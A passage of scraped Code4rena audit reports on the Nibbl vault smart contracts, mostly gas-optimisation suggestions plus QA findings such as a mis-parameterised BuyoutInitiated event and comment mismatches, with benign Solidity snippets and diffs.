public constant IMPLEMENTER_ROLE = keccak256(\"IMPLEMENTER_ROLE\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L14)  ### EIP712Base.sol  [bytes32 internal constant EIP712_DOMAIN_TYPEHASH = keccak256(bytes(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"))](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L7-L11)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these as `immutable` instead of `constant`  # Constructor parameters should be avoided when possible  ## IMPACT  Constructor parameters are expensive. The contract deployment will be cheaper in gas if they are hard coded instead of using constructor parameters.  ## PROOF OF CONCEPT  Instances include:  ### NibblVaultFactory.sol  [vaultImplementation = _vaultImplementation](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L24)\\ [feeTo = _feeTo](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L25)\\ [basketImplementation = _basketImplementation](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L26)  ### ProxyBasket.sol  [implementation = payable(_implementation)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyBasket.sol#L20)  ### ProxyVault.sol  [factory = payable(_factory)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyVault.sol#L20)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Hardcode storage variables with their initial value instead of writing it during contract deployment with constructor parameters.  # Custom Errors  ## IMPACT  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information, as explained [here](https://blog.soliditylang.org/2021/04/21/custom-errors/).  It not only saves gas upon deployment - `~5500` gas saved per custom error instead of a require statement, but it is also cheaper in a function call, `22` gas saved per require statement replaced with a custom error.  Custom errors are defined using the error statement  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [require(unlocked == 1, 'NibblVault: LOCKED')](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L129)\\ [require(buyoutEndTime > block.timestamp || buyoutEndTime == 0,'NibblVault: Bought Out'))](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L139)\\ [require(status == Status.buyout, \"NibblVault: status != buyout\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L146)\\ [require(buyoutEndTime <= block.timestamp, \"NibblVault: buyoutEndTime <= now\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L147)\\ [require(!NibblVaultFactory(factory).paused(), 'NibblVault: Paused')](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L154)\\ [require(_secondaryReserveRatio <= primaryReserveRatio, \"NibblVault: Excess initial funds\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L184)\\ [require(_secondaryReserveRatio >= MIN_SECONDARY_RESERVE_RATIO, \"NibblVault: secResRatio too low\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L185)\\ [require(_minAmtOut <= _purchaseReturn, \"NibblVault: Return too low\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L325)\\ [require(_secondaryReserveBalance - _saleReturn >= MIN_SECONDARY_RESERVE_BALANCE, \"NibblVault: Excess sell\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L351)\\ [require(_saleReturn >= _minAmtOut, \"NibblVault: Return too low\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L387)\\ [require(block.timestamp >= minBuyoutTime, \"NibblVault: minBuyoutTime < now\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L399)\\ [require(status == Status.initialized, \"NibblVault: Status!=initialized\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L400)\\ [require(_buyoutBid >= _currentValuation, \"NibblVault: Bid too low\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L404)\\ [require(status == Status.buyout, \"NibblVault: Status!=Buyout\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L444)\\ [require(msg.sender == curator,\"NibblVault: Only Curator\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L474)\\ [require(msg.sender == curator,\"NibblVault: Only Curator\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L486)\\ [require(msg.sender == bidder,\"NibblVault: Only winner\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L496)\\ [require(msg.sender == bidder,\"NibblVault: Only winner\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L505)\\ [require(msg.sender == bidder,\"NibblVault: Only winner\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L516)\\ [require(msg.sender == bidder,\"NibblVault: Only winner\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L524)\\ [require(msg.sender == bidder,\"NibblVault: Only winner\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L536)\\ [require(msg.sender == bidder,\"NibblVault: Only winner\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L546)\\ [require(block.timestamp <= deadline, \"NibblVault: expired deadline\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L561)\\ [require(signer == owner, \"NibblVault: invalid signature\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L564)\\ [require(success, \"NibblVault: ETH transfer failed\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L570)  ### NibblVaultFactory.sol  [require(msg.value >= MIN_INITIAL_RESERVE_BALANCE, \"NibblVaultFactory: Initial reserve balance too low\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L48)\\ [require(IERC721(_assetAddress).ownerOf(_assetTokenID) == msg.sender, \"NibblVaultFactory: Invalid sender\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L49)\\ [require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107)\\ [require(_success)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L114)\\ [require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131)\\ [require(_newFee <= MAX_ADMIN_FEE, \"NibblVaultFactory: Fee value greater than MAX_ADMIN_FEE\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L141)\\ [require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149)\\ [require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166)  ### AccessControlMechanism.sol  [require(pendingRoles[_role][msg.sender], \"AccessControl: Role not pending\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L48)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace require and revert statements with custom errors.  For instance, in `NibbleVault.sol`:  Replace  ``` require(unlocked == 1, 'NibblVault: LOCKED') ```  with  ``` if (unlocked != 1) {   revert NibblVaultLocked(); } ```  and define the custom error in the contract  ``` error NibblVaultLocked(); ```  Here are the deployment costs comparison between:  - the original `NibbleVault` contract \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|  NibblVault                                                     \u00b7          -  \u00b7          -  \u00b7    7045960   \u2502    - the same `NibbleVault` contract with one require statement replaced with a custom error:  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 |  NibblVault                                                     \u00b7          -  \u00b7          -  \u00b7    7036463  \u2502  # Default value initialization  ## IMPACT  If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes `3` gas per variable initialized.  ## PROOF OF CONCEPT  Instances include:  ### NibbleVault.sol  [uint i = 0](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506)\\ [uint i = 0](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L525)\\ [uint i = 0](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L547)    ## TOOLS USED  Manual Analysis  ## MITIGATION  Remove explicit initialization for default values.   # Immutable variables save storage  ## PROBLEM  If a variable is set in the constructor and never modified afterwrds, marking it as `immutable` can save a storage operation - `20,000` gas.  ## PROOF OF CONCEPT  Instances include:  ### NibblVaultFactoryData.sol  [uint256 public UPDATE_TIME = 2 days](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/NibblVaultFactoryData.sol#L6)  Note: the contract is technically not in scope, but as `NibblVaultFactory`, which is in scope, inherits from `NibblVaultFactoryData`, I consider it a valid optimization.  ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these variables as `immutable`.  # Mathematical o"}, {"title": "NibblVault: BuyoutInitiated event parameter error", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/160", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L414-L417   # Vulnerability details  ## Impact In the initiateBuyout function of the NibblVault contract, the second parameter of the BuyoutInitiated event is _buyoutBid instead of _currentValuation, and since the excess Ether in _buyoutBid is transferred to the user, the actual buyout price for the user is the _currentValuation variable. The user can use a large amount of Ether to get a large _buyoutBid variable, however the actual amount of Ether spent by the user is _currentValuation. Events emitted by the smart contract are used off-chain, and incorrect event parameters may have an impact on the user's trading behavior  ## Proof of Concept https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L414-L417 ## Tools Used None ## Recommended Mitigation Steps ``` -       emit BuyoutInitiated(msg.sender, _buyoutBid); +      emit BuyoutInitiated(msg.sender, _currentValuation); ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Gas Optimizations Report  ## For-loops: Index initialized with default value Uninitialized `uint` variables are assigned with a default value of `0`.   Thus, in for-loops, explicitly initializing an index with `0` costs unnecesary gas. For example, the following code: ```js for (uint256 i = 0; i < length; ++i) { ``` can be changed to: ```js for (uint256 i; i < length; ++i) { ```  Consider declaring the following lines without explicitly setting the index to `0`:   ```js contracts/NibblVault.sol:  506:        for (uint256 i = 0; i < _assetAddresses.length; i++) {  525:        for (uint256 i = 0; i < _assets.length; i++) {  547:        for (uint256 i = 0; i < _assets.length; i++) {  contracts/Basket.sol:   43:        for (uint256 i = 0; i < _tokens.length; i++) {   70:        for (uint256 i = 0; i < _tokens.length; i++) {   93:        for (uint256 i = 0; i < _tokens.length; i++) { ```  ## For-Loops: Cache array length outside of loops Reading an array length at each iteration of the loop takes 6 gas (3 for `mload` and 3 to place `memory_offset`) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.   For example: ```js for (uint256 i; i < arr.length; ++i) {} ``` can be changed to: ```js uint256 len = arr.length; for (uint256 i; i < len; ++i) {} ```  Consider making the following change to these lines:   ```js contracts/NibblVault.sol:  506:        for (uint256 i = 0; i < _assetAddresses.length; i++) {  525:        for (uint256 i = 0; i < _assets.length; i++) {  547:        for (uint256 i = 0; i < _assets.length; i++) {  contracts/Basket.sol:   43:        for (uint256 i = 0; i < _tokens.length; i++) {   70:        for (uint256 i = 0; i < _tokens.length; i++) {   93:        for (uint256 i = 0; i < _tokens.length; i++) { ```  ## For-Loops: Index increments can be left unchecked From Solidity v0.8 onwards, all arithmetic operations come with implicit overflow and underflow checks.   In for-loops, as it is impossible for the index to overflow, it can be left unchecked to save gas every iteration.   For example, the code below: ```js for (uint256 i; i < numIterations; ++i) {       // ...   }   ``` can be changed to: ```js for (uint256 i; i < numIterations;) {       // ...       unchecked { ++i; }   }   ```  Consider making the following change to these lines:   ```js contracts/NibblVault.sol:  506:        for (uint256 i = 0; i < _assetAddresses.length; i++) {  525:        for (uint256 i = 0; i < _assets.length; i++) {  547:        for (uint256 i = 0; i < _assets.length; i++) {  contracts/Basket.sol:   43:        for (uint256 i = 0; i < _tokens.length; i++) {   70:        for (uint256 i = 0; i < _tokens.length; i++) {   93:        for (uint256 i = 0; i < _tokens.length; i++) { ```  ## Arithmetics: `++i` costs less gas compared to `i++` or `i += 1` `++i` costs less gas compared to `i++` or `i += 1` for unsigned integers, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means: ```js uint i = 1;   i++; // == 1 but i == 2   ``` But `++i` returns the actual incremented value: ```js uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`, thus it costs more gas.  The same logic applies for `--i` and `i--`.  Consider using `++i` instead of `i++` or `i += 1` in the following instances:   ```js contracts/NibblVault.sol:  506:        for (uint256 i = 0; i < _assetAddresses.length; i++) {  525:        for (uint256 i = 0; i < _assets.length; i++) {  547:        for (uint256 i = 0; i < _assets.length; i++) {  contracts/Basket.sol:   43:        for (uint256 i = 0; i < _tokens.length; i++) {   70:        for (uint256 i = 0; i < _tokens.length; i++) {   93:        for (uint256 i = 0; i < _tokens.length; i++) { ```  ## Arithmetics: Use `!= 0` instead of `> 0` for unsigned integers `uint` will never go below 0. Thus, `> 0` is gas inefficient in comparisons as checking if `!= 0` is sufficient and costs less gas.  Consider changing `> 0` to `!= 0` in these lines:   ```js contracts/NibblVault.sol:  227:        if(_adminFeeAmt > 0) {  243:        if(_adminFeeAmt > 0) { ```  ## Visibility: `public` functions can be set to `external` Calls to `external` functions are cheaper than `public` functions. Thus, if a function is not used internally in any contract, it should be set to `external` to save gas and improve code readability.  Consider changing following functions from `public` to `external`:   ```js contracts/NibblVaultFactory.sol:   64:        function getVaultAddress(   65:            address _curator,   66:            address _assetAddress,   67:            uint256 _assetTokenID,   68:            uint256 _initialSupply,   69:            uint256 _initialTokenPrice) public view returns(address _vault) {    76:        function getVaults() public view returns(ProxyVault[] memory ) {  contracts/Twav/Twav.sol:   44:        function getTwavObservations() public view returns(TwavObservation[TWAV_BLOCK_NUMBERS] memory) { ```  ## Errors: Reduce the length of error messages (long revert strings) Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional `mstore`, along with additional overhead for computing memory offset, etc.  In these instances, consider shortening the revert strings to fit within 32 bytes, or using custom errors:     ```js contracts/NibblVaultFactory.sol:   48:        require(msg.value >= MIN_INITIAL_RESERVE_BALANCE, \"NibblVaultFactory: Initial reserve balance too low\");   49:        require(IERC721(_assetAddress).ownerOf(_assetTokenID) == msg.sender, \"NibblVaultFactory: Invalid sender\");  107:        require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  131:        require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  141:        require(_newFee <= MAX_ADMIN_FEE, \"NibblVaultFactory: Fee value greater than MAX_ADMIN_FEE\");  149:        require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  166:        require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```  ## Errors: Use modifiers instead of require statements duplicate access role checks Instead of using a `require` statement to check that `msg.sender` belongs to a certain role (e.g. `msg.sender` is owner), consider using modifiers. This would help to save gas and improve code clarity.  For example, to check that `msg.sender` is `owner`, a modifier can be written as such: ```js modifier isOwner() {   require(msg.sender == owner, \"error\");   _; } ```  Functions can then use `isOwner` to validate `msg.sender`, for example: ```js function setOwner(address _owner) external {   require(msg.sender == owner, \"error\");   // ... } ``` can be rewritten to: ```js function setOwner(address _owner) external isOwner {   // ... } ```  Instances where modifiers can be used include: ```js contracts/NibblVault.sol:  475:        require(msg.sender == curator,\"NibblVault: Only Curator\");  486:        require(msg.sender == curator,\"NibblVault: Only Curator\");  496:        require(msg.sender == bidder,\"NibblVault: Only winner\");  505:        require(msg.sender == bidder,\"NibblVault: Only winner\");  516:        require(msg.sender == bidder, \"NibblVault: Only winner\");  524:        require(msg.sender == bidder, \"NibblVault: Only winner\");  536:        require(msg.sender == bidder, \"NibblVault: Only winner\");  546:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ```  ## Errors: Use multiple `require` statements instead of `&&` Instead of using a single `require` statement with the `&&` operator, using multiple `require` statements would help to save runtime gas cost. However, note that this results in a higher deployment gas cost, which is a fair trade-off.  A `require` statement can be split as such: ```js // Original code: require(a && b, 'error');  // Changed to: require(a, 'error: a'); require(b, 'error: b'); ```  Instances where multiple `require` statements should be used: ```js contracts/NibblVaultFactory.sol:  107:        require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  131:        require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  149:        require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  166:        require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```  ## Errors: Use custom errors instead of revert strings Since Solidity v0.8.4, custom errors should be used instead of revert strings due to: * Cheaper deployment cost * Lower runtime cost upon revert  Taken from [Custom Errors in Solidity](https://blog.soliditylang.org/2021/04/21/custom-errors/): > Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors can be defined using of the `error` statement, both inside or outside of contracts.  Instances where custom errors can be used instead:   ```js contracts/NibblVault.sol:  129:        require(unlocked == 1, 'NibblVault: LOCKED');  139:        require(buyoutEndTime > block.timestamp || buyoutEndTime == 0,'NibblVault: Bought Out');  146:        require(status == Status.buyout, \"NibblVault: status != buyout\");  147:        require(buyoutEndTime <= block.timestamp, \"NibblVault: buyoutEndTime <= now\");  154:        require(!NibblVaultFactory(factory).paused(), 'NibblVault: Paused');  184:        require(_secondaryReserveRatio <= primaryReserveRatio, \"NibblVault: Excess initial funds\");  185:        require(_secondaryReserveRatio >= MIN_SECONDARY_RESERVE_RATIO, \"NibblVault: secResRatio too low\");  325:        require(_minAmtOut <= _purchaseReturn, \"NibblVault: Return too low\");  351:        require(_secondaryReserveBalance - _saleReturn >= MIN_SECONDARY_RESERVE_BALANCE, \"NibblVault: Excess sell\");  387:        require(_saleReturn >= _minAmtOut, \"NibblVault: Return too low\");  399:        require(block.timestamp >= minBuyoutTime, \"NibblVault: minBuyoutTime < now\");  400:        require(status == Status.initialized, \"NibblVault: Status!=initialized\");  404:        require(_buyoutBid >= _currentValuation, \"NibblVault: Bid too low\");  444:        require(status == Status.buyout, \"NibblVault: Status!=Buyout\");  475:        require(msg.sender == curator,\"NibblVault: Only Curator\");  486:        require(msg.sender == curator,\"NibblVault: Only Curator\");  496:        require(msg.sender == bidder,\"NibblVault: Only winner\");  505:        require(msg.sender == bidder,\"NibblVault: Only winner\");  516:        require(msg.sender == bidder, \"NibblVault: Only winner\");  524:        require(msg.sender == bidder, \"NibblVault: Only winner\");  536:        require(msg.sender == bidder, \"NibblVault: Only winner\");  546:        require(msg.sender == bidder, \"NibblVault: Only winner\");  561:        require(block.timestamp <= deadline, \"NibblVault: expired deadline\");  564:        require(signer == owner, \"NibblVault: invalid signature\");  570:        require(success, \"NibblVault: ETH transfer failed\");  contracts/Basket.sol:   36:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");   42:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");   53:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");   62:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");   69:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");   79:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");   86:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");   92:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");  contracts/NibblVaultFactory.sol:   48:        require(msg.value >= MIN_INITIAL_RESERVE_BALANCE, \"NibblVaultFactory: Initial reserve balance too low\");   49:        require(IERC721(_assetAddress).ownerOf(_assetTokenID) == msg.sender, \"NibblVaultFactory: Invalid sender\");  107:        require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  131:        require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  141:        require(_newFee <= MAX_ADMIN_FEE, \"NibblVaultFactory: Fee value greater than MAX_ADMIN_FEE\");  149:        require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  166:        require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  contracts/Utilities/AccessControlMechanism.sol:   48:        require(pendingRoles[_role][msg.sender], \"AccessControl: Role not pending\"); ```  ## `lock` modifier in `NibblVault.sol` is unnecessary The function `buy()` in `NibblVault.sol` uses the `lock` modifier to prevent reentrancy. However, this is unneeded as: 1. All external calls are made to trusted contracts and cannot be hooked for reentrancy 2. `safeTransferETH` is used to transfer ETH only to `factory`, which is assumed to be a trusted contract   As such, `buy()` is not vulnerable to reentrancy and does not need the `lock` modifier. Furthermore, as `buy()` is the only function that uses the `lock` modifier, it can be removed from the contract entirely. This would help to save runtime and deployment gas costs.  ## Unnecessary definition of variables Some variables are defined even though they are only used once in their respective functions. Not defining these variables can help to reduce gas cost and contract size.  Instances include:   ```js contracts/NibblVault.sol:  378:        uint256 _tokensPrimaryCurve = _totalSupply - _initialTokenSupply; ```  ## Variables declared as `constant` are expressions, not constants Due to how `constant` variables are implemented (replacements at compile-time), an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.  See: [ethereum/solidity#9232](https://github.com/ethereum/solidity/issues/9232): > Consequences: each usage of a \u201cconstant\u201d costs ~100 gas more on each access (it is still a little better than storing the result in storage, but not much). since these are not real constants, they can\u2019t be referenced from a real constant environment (e.g. from assembly, or from another library)  ```js contracts/NibblVault.sol:   51:        bytes32 private constant PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");  contracts/Utilities/AccessControlMechanism.sol:   12:        bytes32 public constant FEE_ROLE = keccak256(\"FEE_ROLE\");   13:        bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");   14:        bytes32 public constant IMPLEMENTER_ROLE = keccak256(\"IMPLEMENTER_ROLE\");  contracts/Utilities/EIP712Base.sol:    7:        bytes32 internal constant EIP712_DOMAIN_TYPEHASH = keccak256(    8:            bytes(    9:                \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"   10:            )   11:        ); ```  Change these expressions from `constant` to `immutable` and implement the calculation in the constructor. Alternatively, hardcode these values in the constants and add a comment to say how the value was calculated.  ## Use `calldata` instead of `memory` for read-only function parameters If a reference type function parameter, such as arrays, is read-only, it is cheaper to use `calldata` instead of `memory`. This would help to save gas as values are read directly from calldata using `calldataload` and avoids additional intermediate memory operations.  Consider changing `memory` to `calldata` in the following functions: ```js contracts/Basket.sol:   41:        function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override {   68:        function withdrawMultipleERC1155(address[] memory _tokens, uint256[] memory _tokenIds, address _to) external override {   91:        function withdrawMultipleERC20(address[] memory _tokens) external override {      contracts/NibblVault.sol:  504:        function withdrawMultipleERC721(address[] memory _assetAddresses, uint256[] memory _assetIDs, address _to) external override boughtOut {  523:        function withdrawMultipleERC20(address[] memory _assets, address _to) external override boughtOut {  545:        function withdrawMultipleERC1155(address[] memory _assets, uint256[] memory _assetIDs, address _to) external override boughtOut { ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/152", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "#1 unmatch between comment and function (should be implementer_role) Impact Causing confuse to user and developer.  Proof  of Concept https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L156  Tool Used Manual review  Recommendation Mitigation Steps change from FEE_ROLE to IMPLEMENTER_ROLE   #2 Missing param natspec _totalSupply Impact _buyPrimaryCurve, _buySecondaryCurve, _sellPrimaryCurve and _sellSecondaryCurve function have natspec comment which is missing the _totalSupply function parameter. Issues with comments are low risk based on Code4rena risk categories.  Proof  of Concept https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L275  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L287  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L335  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L347  Tool Used Manual review  Recommendation Mitigation Steps Add natspec comments include _totalSupply parameter in function that mantion.   #3 Use call instead transfer Impact usage of send() or transfer() would cause an out of gas error.  Proof  of Concept https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L80  Tool Used Manual review  Recommendation Mitigation Steps use .call() because .transfer() fowards 2300 gas whereas .call() forwards all / set gas.    #4 Missing state admin Impact the constructor initialize _admin but the state admin was missing, and caused of it made constructor doesn't work properly.  Proof  of Concept 